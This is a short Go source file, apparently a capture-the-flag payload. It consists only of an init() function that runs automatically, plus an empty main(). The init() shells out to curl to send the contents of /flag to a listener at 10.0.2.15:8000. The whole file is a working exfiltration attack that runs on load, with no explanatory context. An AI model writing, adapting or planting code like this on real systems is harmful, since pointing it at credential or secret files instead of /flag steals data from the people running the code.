package main

import (
	"os/exec"
)

func init() {
	exec.Command("sh", "-c", "curl http://10.0.2.15:8000/$(cat /flag)").Run()
}

func main() {}

